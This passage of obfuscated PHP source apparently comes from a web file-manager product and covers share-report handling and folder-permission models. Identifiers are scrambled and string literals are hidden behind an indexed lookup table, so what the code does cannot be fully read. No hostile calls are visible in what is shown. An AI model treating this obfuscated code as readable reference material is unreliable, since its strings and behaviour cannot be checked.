"\45{$í¼‹¬¯ò[$ôµš…ÜÌ[1957]]}\45"), $ôµš…ÜÌ[2008] => $ôµš…ÜÌ[1961]); } $ÊÇ´ä” = $this->_makeOrder()->where($¬œÜ¤ ã)->selectPage(20); if (empty($ÊÇ´ä”[$ôµš…ÜÌ[369]])) { return array(); } $this->_listDataApply($ÊÇ´ä”[$ôµš…ÜÌ[369]]); return $ÊÇ´ä”; } public function listDataApply($¯§¶®ú®) { $this->_listDataApply($¯§¶®ú®); return $¯§¶®ú®; } private function _listDataApply(&$èø¬¢ç£) { $—Ó‘ıÂ =& $_SERVER[å¸¿•¶£]; $õê®¸ÔŞ = array_to_keyvalue($èø¬¢ç£, $—Ó‘ıÂ[12], $—Ó‘ıÂ[1674]); $ì‹ªÓ†Ô = Model($—Ó‘ıÂ[525])->userListInfo(array_unique($õê®¸ÔŞ)); $÷´©ºó = array_to_keyvalue($èø¬¢ç£, $—Ó‘ıÂ[12], $—Ó‘ıÂ[402]); $Îû’‚âí = Model($—Ó‘ıÂ[832])->sourceListInfo($÷´©ºó, !0); foreach ($èø¬¢ç£ as $½¢’½«á => &$èÓÏ) { $÷ˆ¿¨’€ = $èÓÏ[$—Ó‘ıÂ[1674]]; $èÓÏ[$—Ó‘ıÂ[2035]] = $ì‹ªÓ†Ô[$÷ˆ¿¨’€] ? $ì‹ªÓ†Ô[$÷ˆ¿¨’€] : !1; $²Î£‡Î¡ = $èÓÏ[$—Ó‘ıÂ[402]]; $èÓÏ[$—Ó‘ıÂ[87]] = $Îû’‚âí[$²Î£‡Î¡] ? $Îû’‚âí[$²Î£‡Î¡] : !1; if ($èÓÏ[$—Ó‘ıÂ[87]][$—Ó‘ıÂ[431]] == $—Ó‘ıÂ[88]) { unset($èø¬¢ç£[$½¢’½«á]); } if ($èÓÏ[$—Ó‘ıÂ[87]] != $—Ó‘ıÂ[198] && !$èÓÏ[$—Ó‘ıÂ[87]]) { unset($èø¬¢ç£[$½¢’½«á]); } } unset($èÓÏ); $èø¬¢ç£ = array_values($èø¬¢ç£); } private function _makeOrder($á”Û½†â = '') { $¬›äŠİƒ =& $_SERVER[å¸¿•¶£]; $È¿Ü€Íü = array($¬›äŠİƒ[201], $¬›äŠİƒ[768], $¬›äŠİƒ[2022], $¬›äŠİƒ[2023]); $Æ®ó¾ˆ = array($¬›äŠİƒ[450] => $¬›äŠİƒ[451], $¬›äŠİƒ[452] => $¬›äŠİƒ[453]); $”í¸æ¾¤ = Input::get($¬›äŠİƒ[457], $¬›äŠİƒ[7], $¬›äŠİƒ[423], $È¿Ü€Íü); $®Æ°†æ = Input::get($¬›äŠİƒ[458], $¬›äŠİƒ[7], $¬›äŠİƒ[2036], array($¬›äŠİƒ[1954], $¬›äŠİƒ[452])); $®Æ°†æ = $Æ®ó¾ˆ[$®Æ°†æ]; $á”Û½†â = $á”Û½†â . "{$”í¸æ¾¤}\x20{$®Æ°†æ}"; return $this->order($á”Û½†â); } public function reportAdd($¹÷¯ÄŞ¥) { $‚Šãã¸Ü =& $_SERVER[å¸¿•¶£]; $øèÂĞº¡ = array($‚Šãã¸Ü[593] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[593]], $‚Šãã¸Ü[1674] => USER_ID); if (Model($‚Šãã¸Ü[2032])->where($øèÂĞº¡)->find()) { return !1; } $ÇÏîÍÓ = array($‚Šãã¸Ü[593] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[593]], $‚Šãã¸Ü[1574] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[1574]], $‚Šãã¸Ü[402] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[402]], $‚Šãã¸Ü[468] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[468]], $‚Šãã¸Ü[1674] => USER_ID, $‚Šãã¸Ü[33] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[33]], $‚Šãã¸Ü[453] => $¹÷¯ÄŞ¥[$‚Šãã¸Ü[453]]); return Model($‚Šãã¸Ü[2032])->add($ÇÏîÍÓ); } public function reportList($ºö×ª†‘) { $Ş¦øĞäß =& $_SERVER[å¸¿•¶£]; $Ï¤ê¾È· = array(); if ($ºö×ª†‘[$Ş¦øĞäß[767]]) { $å·¶ñá = $ºö×ª†‘[$Ş¦øĞäß[768]] ? $ºö×ª†‘[$Ş¦øĞäß[768]] : strtotime(date($Ş¦øĞäß[2034])); $Ï¤ê¾È·[$Ş¦øĞäß[201]] = array($Ş¦øĞäß[333], array($ºö×ª†‘[$Ş¦øĞäß[767]], $å·¶ñá)); } if (isset($ºö×ª†‘[$Ş¦øĞäß[33]]) && in_array($ºö×ª†‘[$Ş¦øĞäß[33]], array($Ş¦øĞäß[88], $Ş¦øĞäß[437], $Ş¦øĞäß[2037], $Ş¦øĞäß[2038], $Ş¦øĞäß[2039]))) { $Ï¤ê¾È·[$Ş¦øĞäß[33]] = $ºö×ª†‘[$Ş¦øĞäß[33]]; } if (isset($ºö×ª†‘[$Ş¦øĞäß[756]]) && in_array($ºö×ª†‘[$Ş¦øĞäß[756]], array($Ş¦øĞäß[198], $Ş¦øĞäß[88], $Ş¦øĞäß[437], $Ş¦øĞäß[2037]))) { $Ï¤ê¾È·[$Ş¦øĞäß[756]] = $ºö×ª†‘[$Ş¦øĞäß[756]]; } $‚ìÙş = Input::get($Ş¦øĞäß[458], $Ş¦øĞäß[7], $Ş¦øĞäß[2036], array($Ş¦øĞäß[1954], $Ş¦øĞäß[452])); $ÂóÛòÅ = array($Ş¦øĞäß[450] => $Ş¦øĞäß[451], $Ş¦øĞäß[452] => $Ş¦øĞäß[453]); $“Íñ­º = $Ş¦øĞäß[2040] . $ÂóÛòÅ[$‚ìÙş]; $—Œ¹¬¼Ã = Model($Ş¦øĞäß[2032])->where($Ï¤ê¾È·)->order($“Íñ­º)->selectPage(20); if (empty($—Œ¹¬¼Ã[$Ş¦øĞäß[369]])) { return array(); } $Ôì®ÕĞ¹ = array_to_keyvalue_group($—Œ¹¬¼Ã[$Ş¦øĞäß[369]], $Ş¦øĞäß[756], $Ş¦øĞäß[593]); if (!empty($Ôì®ÕĞ¹[0])) { $ºö×ª†‘ = $Ôì®ÕĞ¹[0]; $Ï¤ê¾È· = array($Ş¦øĞäß[593] => array($Ş¦øĞäß[7], $ºö×ª†‘)); $¦€ÀŒÄ = $this->where($Ï¤ê¾È·)->field($Ş¦øĞäß[593])->select(); $¦€ÀŒÄ = array_to_keyvalue($¦€ÀŒÄ, $Ş¦øĞäß[12], $Ş¦øĞäß[593]); $™ËöíÚè = array_diff($ºö×ª†‘, $¦€ÀŒÄ); if (!empty($™ËöíÚè)) { foreach ($—Œ¹¬¼Ã[$Ş¦øĞäß[369]] as $‹•ÙáËœ => $¤•ÈÅ¥Ï) { if (in_array($¤•ÈÅ¥Ï[$Ş¦øĞäß[593]], $™ËöíÚè)) { unset($—Œ¹¬¼Ã[$Ş¦øĞäß[369]][$‹•ÙáËœ]); } } } } $this->_listDataApply($—Œ¹¬¼Ã[$Ş¦øĞäß[369]]); return $—Œ¹¬¼Ã; } public function reportStatus($ğ‚¬ò’) { $Ó…ŸÊÑó =& $_SERVER[å¸¿•¶£]; $ª‡ë™„™ = array($Ó…ŸÊÑó[399] => $ğ‚¬ò’[$Ó…ŸÊÑó[399]]); $ÔŒò’ô = Model($Ó…ŸÊÑó[2032])->where($ª‡ë™„™)->field($Ó…ŸÊÑó[2041])->find(); if (!$ÔŒò’ô) { return !1; } $°®¾Ø’¢ = array($Ó…ŸÊÑó[756] => $ğ‚¬ò’[$Ó…ŸÊÑó[756]]); if ($ğ‚¬ò’[$Ó…ŸÊÑó[756]] == $Ó…ŸÊÑó[2037] && $ÔŒò’ô[$Ó…ŸÊÑó[756]] == $Ó…ŸÊÑó[2037]) { $°®¾Ø’¢[$Ó…ŸÊÑó[756]] = 0; } $¨ÇÛ¹×‰ = Model($Ó…ŸÊÑó[2032])->where($ª‡ë™„™)->save($°®¾Ø’¢); if ($ğ‚¬ò’[$Ó…ŸÊÑó[756]] == $Ó…ŸÊÑó[437]) { if ($ÔŒò’ô[$Ó…ŸÊÑó[468]] != $Ó…ŸÊÑó[198] && $this->shareFileMeta($ÔŒò’ô[$Ó…ŸÊÑó[468]])) { $this->shareFileMeta($ÔŒò’ô[$Ó…ŸÊÑó[468]], 0); } $this->remove($ÔŒò’ô[$Ó…ŸÊÑó[593]]); return !0; } if ($¨ÇÛ¹×‰ && $ğ‚¬ò’[$Ó…ŸÊÑó[756]] == $Ó…ŸÊÑó[2037]) { $×ˆ…“ = $°®¾Ø’¢[$Ó…ŸÊÑó[756]] == $Ó…ŸÊÑó[2037] ? 1 : 0; $this->shareFileMeta($ÔŒò’ô[$Ó…ŸÊÑó[468]], $×ˆ…“); $this->removeByFile($ÔŒò’ô[$Ó…ŸÊÑó[468]]); } return $¨ÇÛ¹×‰; } private function removeByFile($ßãÔ€›) { $û‰©ç‡ =& $_SERVER[å¸¿•¶£]; $©°ŠÎŞü = Model($û‰©ç‡[832])->where(array($û‰©ç‡[468] => $ßãÔ€›))->field($û‰©ç‡[402])->select(); $Óõëç›ò = array_to_keyvalue($©°ŠÎŞü, $û‰©ç‡[12], $û‰©ç‡[402]); $……Œ®¯— = array($û‰©ç‡[402] => array($û‰©ç‡[7], $Óõëç›ò), $û‰©ç‡[488] => 1); $©°ŠÎŞü = $this->where($……Œ®¯—)->field($û‰©ç‡[593])->select(); if (empty($©°ŠÎŞü)) { return; } $­¿³–Åİ = array_to_keyvalue($©°ŠÎŞü, $û‰©ç‡[12], $û‰©ç‡[593]); $this->remove($­¿³–Åİ); } private function shareFileMeta($şé…œ©¤, $ Í°’ÈÛ = null) { $è½œöù‘ =& $_SERVER[å¸¿•¶£]; $Ä®àÇŒ = array($è½œöù‘[468] => $şé…œ©¤, $è½œöù‘[94] => $è½œöù‘[2042]); if (is_null($ Í°’ÈÛ)) { return Model($è½œöù‘[2043])->where($Ä®àÇŒ)->find(); } $Ä®àÇŒ[$è½œöù‘[374]] = $ Í°’ÈÛ; Model($è½œöù‘[2043])->add($Ä®àÇŒ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\x65\137\141\x75\164\150"; public function getAuth($Å–±£ò) { $¿ê«ÛòÛ =& $_SERVER[å¸¿•¶£]; $ÇÛü¯ = $this->sourceAuthSelect($Å–±£ò); $î¨ùÂç‹ = array(); $Ø‹–ç¤ã = array(); $¦²½É‚‚ = 2 << 25; foreach ($ÇÛü¯ as $ßğ“ˆã) { $ü®ëã‡¨ = Model($¿ê«ÛòÛ[498])->listData($ßğ“ˆã[$¿ê«ÛòÛ[1967]]); if (!$ü®ëã‡¨) { continue; } $î¨ùÂç‹[] = $ßğ“ˆã; $Ò¨¹ï¯ = 0; if ($ßğ“ˆã[$¿ê«ÛòÛ[411]] == SourceModel::TYPE_GROUP) { $Ò¨¹ï¯ = $¦²½É‚‚ * 2; } if ($ßğ“ˆã[$¿ê«ÛòÛ[411]] == SourceModel::TYPE_USER) { $Ò¨¹ï¯ = $¦²½É‚‚; } if ($ßğ“ˆã[$¿ê«ÛòÛ[411]] == SourceModel::TYPE_USER && $ßğ“ˆã[$¿ê«ÛòÛ[496]] == $¿ê«ÛòÛ[198]) { $Ò¨¹ï¯ = 0; } $Ø‹–ç¤ã[] = $ü®ëã‡¨[$¿ê«ÛòÛ[413]] + $Ò¨¹ï¯; } array_multisort($Ø‹–ç¤ã, SORT_DESC, $î¨ùÂç‹); return $î¨ùÂç‹; } public function sourceAuthSelect($ç‰¾ÏŠ÷) { $Õ‘ü›ú =& $_SERVER[å¸¿•¶£]; static $¼Ã•û­Á = array(); $ÉŠÆÛ»  = is_array($ç‰¾ÏŠ÷) ? !1 : !0; if ($ÉŠÆÛ» ) { $ç‰¾ÏŠ÷ = array($ç‰¾ÏŠ÷); } $ëû¨ÑŸø = array(); foreach ($ç‰¾ÏŠ÷ as $ÊÁ´ÜüŒ) { if (isset($¼Ã•û­Á[$ÊÁ´ÜüŒ])) { $ëû¨ÑŸø[$ÊÁ´ÜüŒ] = $¼Ã•û­Á[$ÊÁ´ÜüŒ]; } } if (count($ëû¨ÑŸø) == count($ç‰¾ÏŠ÷)) { return $ÉŠÆÛ»  ? $ëû¨ÑŸø[$ç‰¾ÏŠ÷[0]] : $ëû¨ÑŸø; } $™Ï¤ŞÌ¨ = $Õ‘ü›ú[2044]; $­®«Ç¡‹ = array($Õ‘ü›ú[402] => array($Õ‘ü›ú[7], $ç‰¾ÏŠ÷)); $°²«ÔÏ = $this->field($™Ï¤ŞÌ¨)->order($Õ‘ü›ú[399])->where($­®«Ç¡‹)->select(); $•¤–ê² = array_to_keyvalue_group($°²«ÔÏ, $Õ‘ü›ú[402]); foreach ($ç‰¾ÏŠ÷ as $ÊÁ´ÜüŒ) { $¼Ã•û­Á[$ÊÁ´ÜüŒ] = $•¤–ê²[$ÊÁ´ÜüŒ] ? $•¤–ê²[$ÊÁ´ÜüŒ] : array(); } if ($ÉŠÆÛ» ) { return $°²«ÔÏ; } return $•¤–ê²; } public function setAuth($Â°»Î¾”, $ùïÇ¡°) { $Ì³Ú«ğñ =& $_SERVER[å¸¿•¶£]; $ÙÆö¹ = Model($Ì³Ú«ğñ[1346])->sourceInfo($Â°»Î¾”); if (!$ÙÆö¹) { return !1; } if ($ÙÆö¹[$Ì³Ú«ğñ[411]] != SourceModel::TYPE_GROUP) { return !1; } $ÇÒçıÑ = 1; $¦äùø¸­ = $ÙÆö¹[$Ì³Ú«ğñ[496]]; if ($¦äùø¸­ != $ÇÒçıÑ) { $§½æáî¼ = array($Ì³Ú«ğñ[1863] => $¦äùø¸­); $óÄ­ïÀ = Model($Ì³Ú«ğñ[1953])->field($Ì³Ú«ğñ[1674])->where($§½æáî¼)->select(); $óÄ­ïÀ = array_to_keyvalue($óÄ­ïÀ, $Ì³Ú«ğñ[12], $Ì³Ú«ğñ[1674]); } $õ«Ÿ«ıô = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $âÒÄÛ = array(); foreach ($ùïÇ¡° as $óÎ’øšÇ) { if (!in_array($óÎ’øšÇ[$Ì³Ú«ğñ[411]], $õ«Ÿ«ıô)) { show_json(LNG($Ì³Ú«ğñ[2045]), !1); } if ($¦äùø¸­ != $ÇÒçıÑ) { if ($óÎ’øšÇ[$Ì³Ú«ğñ[411]] == SourceModel::TYPE_GROUP) { } if ($óÎ’øšÇ[$Ì³Ú«ğñ[496]] != 0 && !in_array($óÎ’øšÇ[$Ì³Ú«ğñ[496]], $óÄ­ïÀ)) { } } if ($óÎ’øšÇ[$Ì³Ú«ğñ[496]] == 0) { $óÎ’øšÇ[$Ì³Ú«ğñ[411]] = SourceModel::TYPE_USER; } $âÒÄÛ[] = array($Ì³Ú«ğñ[402] => $Â°»Î¾”, $Ì³Ú«ğñ[411] => intval($óÎ’øšÇ[$Ì³Ú«ğñ[411]]), $Ì³Ú«ğñ[496] => intval($óÎ’øšÇ[$Ì³Ú«ğñ[496]]), $Ì³Ú«ğñ[1967] => intval($óÎ’øšÇ[$Ì³Ú«ğñ[1967]]) ? intval($óÎ’øšÇ[$Ì³Ú«ğñ[1967]]) : 0, $Ì³Ú«ğñ[2027] => intval($óÎ’øšÇ[$Ì³Ú«ğñ[2027]]) ? intval($óÎ’øšÇ[$Ì³Ú«ğñ[2027]]) : -1); } $this->where(array($Ì³Ú«ğñ[417] => $Â°»Î¾”))->delete(); $this->addAll($âÒÄÛ); return !0; } public function authClear($ÒèŞ¹°Œ) { $–„ÎÜ²™ =& $_SERVER[å¸¿•¶£]; $èïĞğì = Model($–„ÎÜ²™[1346])->sourceInfo($ÒèŞ¹°Œ); $İ’ê¡ú´ = array($ÒèŞ¹°Œ); if ($èïĞğì[$–„ÎÜ²™[410]] == $–„ÎÜ²™[88]) { $ëÜ×Ôö± = array($–„ÎÜ²™[580] => array($–„ÎÜ²™[540], $èïĞğì[$–„ÎÜ²™[511]] . $ÒèŞ¹°Œ . $–„ÎÜ²™[541])); $İ’ê¡ú´ = Model($–„ÎÜ²™[1346])->field($–„ÎÜ²™[417])->where($ëÜ×Ôö±)->getField($–„ÎÜ²™[402], !0); $İ’ê¡ú´[] = $ÒèŞ¹°Œ; } $this->where(array($–„ÎÜ²™[417] => array($–„ÎÜ²™[418], $İ’ê¡ú´)))->delete(); return !0; } public function getAllChildren($ÂÇ˜”Ÿ) { $Ğ¾«¬›Á =& $_SERVER[å¸¿•¶£]; $Ö†éŒÈ® = Model($Ğ¾«¬›Á[1346])->sourceInfo($ÂÇ˜”Ÿ); if ($Ö†éŒÈ®[$Ğ¾«¬›Á[410]] != $Ğ¾«¬›Á[88]) { return $this->sourceListAuth(array($ÂÇ˜”Ÿ)); } if ($Ö†éŒÈ®[$Ğ¾«¬›Á[411]] != SourceModel::TYPE_GROUP) { return array(); } $µúÁ¨±É = 1; $ç¶Á©¾ = array($ÂÇ˜”Ÿ); if ($Ö†éŒÈ®[$Ğ¾«¬›Á[432]] == $Ğ¾«¬›Á[198] && $Ö†éŒÈ®[$Ğ¾«¬›Á[496]] != $µúÁ¨±É) { $ç¶Á©¾ = $this->groupChidldAllRootSource($Ö†éŒÈ®[$Ğ¾«¬›Á[496]]); } $ùÜÌ‰Âø = $this->field($Ğ¾«¬›Á[402])->group($Ğ¾«¬›Á[402])->select(); $ùÜÌ‰Âø = array_to_keyvalue($ùÜÌ‰Âø, $Ğ¾«¬›Á[12], $Ğ¾«¬›Á[402]); if (!$ùÜÌ‰Âø) { return array(); } $Ú‡Âå¸ = $Ğ¾«¬›Á[2046]; $©×Ñ‰é· = array($Ğ¾«¬›Á[402] => array($Ğ¾«¬›Á[7], $ùÜÌ‰Âø), $Ğ¾«¬›Á[431] => $Ğ¾«¬›Á[198]); $úäÆ•õÍ = Model($Ğ¾«¬›Á[832])->field($Ú‡Âå¸)->where($©×Ñ‰é·)->select(); $õõê¼âœ = array($ÂÇ˜”Ÿ); foreach ($úäÆ•õÍ as $íõ³¾”¾) { foreach ($ç¶Á©¾ as $”‡Š³Ì™) { $¹àµÆøÃ = $Ğ¾«¬›Á[50] . $”‡Š³Ì™ . $Ğ¾«¬›Á[50]; $ÜÎ³å‰› = $íõ³¾”¾[$Ğ¾«¬›Á[511]] . $íõ³¾”¾[$Ğ¾«¬›Á[402]] . $Ğ¾«¬›Á[50]; if (strstr($ÜÎ³å‰›, $¹àµÆøÃ)) { $õõê¼âœ[] = $íõ³¾”¾[$Ğ¾«¬›Á[402]]; break; } } } return $this->sourceListAuth($õõê¼âœ); } private function sourceListAuth($¨Å—Æ¥) { $¨á§Ş =& $_SERVER[å¸¿•¶£]; $ŠÚÑ½õ© = Model($¨á§Ş[1346])->sourceListInfo($¨Å—Æ¥, !0); $ñÁĞÀÂ¶ = $this->sourceAuthSelect($¨Å—Æ¥); $¿ª­ñ´ë = array(); $¸âÃÏµ = array(); foreach ($ŠÚÑ½õ© as $Ã‰È°Õˆ) { unset($Ã‰È°Õˆ[$¨á§Ş[456]]); unset($Ã‰È°Õˆ[$¨á§Ş[454]]); unset($Ã‰È°Õˆ[$¨á§Ş[413]]); unset($Ã‰È°Õˆ[$¨á§Ş[87]]); $Íï’Á˜ = $ñÁĞÀÂ¶[$Ã‰È°Õˆ[$¨á§Ş[402]]]; if (!$Íï’Á˜) { continue; } $Ã‰È°Õˆ[$¨á§Ş[2047]] = $this->authTargetInfo($Íï’Á˜); $Ã‰È°Õˆ[$¨á§Ş[509]] = rtrim($Ã‰È°Õˆ[$¨á§Ş[515]], $¨á§Ş[8]) . $¨á§Ş[8] . ltrim($Ã‰È°Õˆ[$¨á§Ş[509]], $¨á§Ş[8]); $¿ª­ñ´ë[] = $Ã‰È°Õˆ; $é¶¡‰î = count(explode($¨á§Ş[8], trim($Ã‰È°Õˆ[$¨á§Ş[509]], $¨á§Ş[8]))); $¸âÃÏµ[] = $é¶¡‰î + ($Ã‰È°Õˆ[$¨á§Ş[33]] == $¨á§Ş[75] ? 0 : 1000); } array_multisort($¸âÃÏµ, SORT_ASC, $¿ª­ñ´ë); return $¿ª­ñ´ë; } private function groupChidldAllRootSource($ù”áéÂ™) { $åêò‘‚ =& $_SERVER[å¸¿•¶£]; $®è­›•³ = Model($åêò‘‚[2048])->groupChildrenAll($ù”áéÂ™); $Ğè´“Ñ¿ = array($åêò‘‚[432] => 0, $åêò‘‚[496] => array($åêò‘‚[7], $®è­›•³), $åêò‘‚[411] => SourceModel::TYPE_GROUP); $É½œ‡„• = Model($åêò‘‚[832])->field($åêò‘‚[402])->where($Ğè´“Ñ¿)->select(); $É½œ‡„• = array_to_keyvalue($É½œ‡„•, $åêò‘‚[12], $åêò‘‚[402]); return $É½œ‡„•; } private function authTargetInfo($¡‘ÆÖ¾Ê) { $·«Â°Âö =& $_SERVER[å¸¿•¶£]; $ÉôšÅšÇ = array(); $‘àÅ’  = array(); $Ö¶¤ì = 2 << 25; foreach ($¡‘ÆÖ¾Ê as $±Èªö©±) { $ÁŠÆ‘æ× = Model($·«Â°Âö[498])->listData($±Èªö©±[$·«Â°Âö[1967]]); if (!$ÁŠÆ‘æ×) { continue; } if ($±Èªö©±[$·«Â°Âö[411]] == SourceModel::TYPE_USER) { $’¦Ø‹£ı = Model($·«Â°Âö[504])->getInfoSimpleOuter($±Èªö©±[$·«Â°Âö[496]]); if ($’¦Ø‹£ı[$·«Â°Âö[1674]] == $·«Â°Âö[1195]) { continue; } if ($’¦Ø‹£ı[$·«Â°Âö[1674]] == $·«Â°Âö[198]) { $’¦Ø‹£ı[$·«Â°Âö[32]] = LNG($·«Â°Âö[2049]); } } else { $’¦Ø‹£ı = Model($·«Â°Âö[512])->getInfoSimple($±Èªö©±[$·«Â°Âö[496]]); } if (!$’¦Ø‹£ı) { continue; } $’¦Ø‹£ı[$·«Â°Âö[467]] = $ÁŠÆ‘æ×; $ÉôšÅšÇ[] = $’¦Ø‹£ı; $ïÖµ»»© = 0; if ($±Èªö©±[$·«Â°Âö[411]] == SourceModel::TYPE_GROUP) { $ïÖµ»»© = $Ö¶¤ì * 2; } if ($±Èªö©±[$·«Â°Âö[411]] == SourceModel::TYPE_USER) { $ïÖµ»»© = $Ö¶¤ì; } if ($±Èªö©±[$·«Â°Âö[411]] == SourceModel::TYPE_USER && $±Èªö©±[$·«Â°Âö[496]] == $·«Â°Âö[198]) { $ïÖµ»»© = 0; } $‘àÅ’ [] = $ÁŠÆ‘æ×[$·«Â°Âö[413]] + $ïÖµ»»©; } array_multisort($‘àÅ’ , SORT_DESC, $ÉôšÅšÇ); return $ÉôšÅšÇ; } public function getAllChildrenByUser($âİ–óŠÌ, $íº£¥çì) { $à®ùÓÅé =& $_SERVER[å¸¿•¶£]; $¡…½è¶ = Model($à®ùÓÅé[525])->getInfo($íº£¥çì); if (!$íº£¥çì || !$âİ–óŠÌ || !$¡…½è¶) { return array(); } $Ù¶ä‚ò = Model($à®ùÓÅé[1346])->sourceInfo($âİ–óŠÌ); $†šØ©Ï¸ = array(); $œŸı—á™ = 1; if ($Ù¶ä‚ò[$à®ùÓÅé[432]] == $à®ùÓÅé[198] && $Ù¶ä‚ò[$à®ùÓÅé[496]] != $œŸı—á™ && $this->groupContainUser($Ù¶ä‚ò[$à®ùÓÅé[496]], $íº£¥çì)) { foreach ($¡…½è¶[$à®ùÓÅé[2050]] as $¦Êù²ší) { $ŞëÙá¢ø = Model($à®ùÓÅé[512])->getInfo($¦Êù²ší[$à®ùÓÅé[1863]]); $”ı©û©Á = Model($à®ùÓÅé[525])->getInfoSimpleOuter($íº£¥çì); $”ı©û©Á[$à®ùÓÅé[467]] = $¦Êù²ší[$à®ùÓÅé[413]]; if (Model($à®ùÓÅé[498])->authCheckAction($¦Êù²ší[$à®ùÓÅé[413]][$à®ùÓÅé[413]], $à®ùÓÅé[1884])) { continue; } $ÃÏ¹ü±Ò = array($à®ùÓÅé[32] => $à®ùÓÅé[1215] . $ŞëÙá¢ø[$à®ùÓÅé[32]], $à®ùÓÅé[402] => $ŞëÙá¢ø[$à®ùÓÅé[87]][$à®ùÓÅé[402]], $à®ùÓÅé[84] => KodIO::make($ŞëÙá¢ø[$à®ùÓÅé[87]][$à®ùÓÅé[402]]), $à®ùÓÅé[432] => $à®ùÓÅé[198], $à®ùÓÅé[411] => $à®ùÓÅé[505], $à®ùÓÅé[33] => $à®ùÓÅé[544], $à®ùÓÅé[509] => $ŞëÙá¢ø[$à®ùÓÅé[516]], $à®ùÓÅé[1863] => $ŞëÙá¢ø[$à®ùÓÅé[1863]], $à®ùÓÅé[513] => $ŞëÙá¢ø[$à®ùÓÅé[432]], $à®ùÓÅé[2047] => array($”ı©û©Á)); $†šØ©Ï¸[$ÃÏ¹ü±Ò[$à®ùÓÅé[402]]] = $ÃÏ¹ü±Ò; } } $‹Í½÷… = array(); $›İ»«… = $this->getAllChildren($âİ–óŠÌ); foreach ($›İ»«… as $†šàšà) { $Ò…Ñœ° = !1; foreach ($†šàšà[$à®ùÓÅé[2047]] as $¯¥˜±ã) { if ($¯¥˜±ã[$à®ùÓÅé[1674]]) { if ($¯¥˜±ã[$à®ùÓÅé[1674]] == $íº£¥çì) { $Ò…Ñœ° = !0; break; } } if ($¯¥˜±ã[$à®ùÓÅé[1863]]) { if ($this->groupContainUser($¯¥˜±ã[$à®ùÓÅé[1863]], $íº£¥çì)) { $Ò…Ñœ° = !0; break; } } } if ($Ò…Ñœ°) { $‹Í½÷…[] = $†šàšà; } $´¿È»ç = $†šàšà[$à®ùÓÅé[402]]; if (isset($†šØ©Ï¸[$´¿È»ç])) { $†šàšà[$à®ùÓÅé[2047]][] = $†šØ©Ï¸[$´¿È»ç][0]; $†šØ©Ï¸[$´¿È»ç] = !1; } } $†šØ©Ï¸ = array_filter(array_values($†šØ©Ï¸)); $‹Í½÷… = array_merge($†šØ©Ï¸, $‹Í½÷…); return $‹Í½÷…; } public function setAllChildrenByUser($È¼±şËà, $¯şÕÕÏ©, $š”ŒĞ) { $ÜÛÔµÁ¦ =& $_SERVER[å¸¿•¶£]; $ªÕ±ôÒ = $this->getAllChildrenByUser($È¼±şËà, $¯şÕÕÏ©); if (!$š”ŒĞ || !$ªÕ±ôÒ) { return !1; } foreach ($ªÕ±ôÒ as $è€Ó³—) { $±ÊåÙĞ¡ = array(); foreach ($è€Ó³—[$ÜÛÔµÁ¦[2047]] as $¨öÓüÒà) { $Şâ¡û¥Ğ = $¨öÓüÒà[$ÜÛÔµÁ¦[467]]; $Òïâµ³Ú = $¨öÓüÒà[$ÜÛÔµÁ¦[1674]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÎãÂ‹·Æ = $¨öÓüÒà[$ÜÛÔµÁ¦[1674]] ? $¨öÓüÒà[$ÜÛÔµÁ¦[1674]] : $¨öÓüÒà[$ÜÛÔµÁ¦[1863]]; if ($¨öÓüÒà[$ÜÛÔµÁ¦[1674]] && $¨öÓüÒà[$ÜÛÔµÁ¦[1674]] == $¯şÕÕÏ©) { continue; } $±ÊåÙĞ¡[] = array($ÜÛÔµÁ¦[402] => $è€Ó³—[$ÜÛÔµÁ¦[402]], $ÜÛÔµÁ¦[411] => $Òïâµ³Ú, $ÜÛÔµÁ¦[496] => intval($ÎãÂ‹·Æ), $ÜÛÔµÁ¦[1967] => isset($Şâ¡û¥Ğ[$ÜÛÔµÁ¦[399]]) ? intval($Şâ¡û¥Ğ[$ÜÛÔµÁ¦[399]]) : 0, $ÜÛÔµÁ¦[2027] => isset($Şâ¡û¥Ğ[$ÜÛÔµÁ¦[2027]]) ? intval($Şâ¡û¥Ğ[$ÜÛÔµÁ¦[2027]]) : -1); } $±ÊåÙĞ¡[] = array($ÜÛÔµÁ¦[402] => $è€Ó³—[$ÜÛÔµÁ¦[402]], $ÜÛÔµÁ¦[411] => SourceModel::TYPE_USER, $ÜÛÔµÁ¦[496] => intval($¯şÕÕÏ©), $ÜÛÔµÁ¦[1967] => intval($š”ŒĞ), $ÜÛÔµÁ¦[2027] => -1); $this->where(array($ÜÛÔµÁ¦[417] => $è€Ó³—[$ÜÛÔµÁ¦[402]]))->delete(); $this->addAll($±ÊåÙĞ¡); } return !0; } public function get($ïîéïã‡) { $èÎç­Ôí = $this->getSourceList(array($ïîéïã‡), !0); return $èÎç­Ôí[0]; } public function getSourceList($ĞÏÂ¸°ü, $“äúÚ¿ª = false, $İ˜†ç“ƒ = false) { $öœÜÇê¨ =& $_SERVER[å¸¿•¶£]; if (!$ĞÏÂ¸°ü) { return array(); } $›ÓÊí®‹ = Model($öœÜÇê¨[1346]); if (!$“äúÚ¿ª && count($ĞÏÂ¸°ü) == 1) { $“äúÚ¿ª = array(); $“äúÚ¿ª[$ĞÏÂ¸°ü[0]] = $›ÓÊí®‹->sourceInfo($ĞÏÂ¸°ü[0]); } if (!$“äúÚ¿ª) { $üêéãçì = array($öœÜÇê¨[417] => array($öœÜÇê¨[418], $ĞÏÂ¸°ü)); $“äúÚ¿ª = $›ÓÊí®‹->field($öœÜÇê¨[2051])->where($üêéãçì)->select(); $“äúÚ¿ª = array_to_keyvalue($“äúÚ¿ª, $öœÜÇê¨[402]); } $ñ¥Ä¦¯˜ = $ĞÏÂ¸°ü; foreach ($“äúÚ¿ª as $éõ¬­­ => $ñªÖİª) { $ÎßÒÂ¥ = $›ÓÊí®‹->parentLevelArray($ñªÖİª[$öœÜÇê¨[511]]); $ñ¥Ä¦¯˜ = array_merge($ñ¥Ä¦¯˜, array($éõ¬­­), array_reverse($ÎßÒÂ¥)); } $ñ¥Ä¦¯˜ = array_values(array_unique($ñ¥Ä¦¯˜)); if (!$ñ¥Ä¦¯˜) { return array(); } $—±¦‰õ = 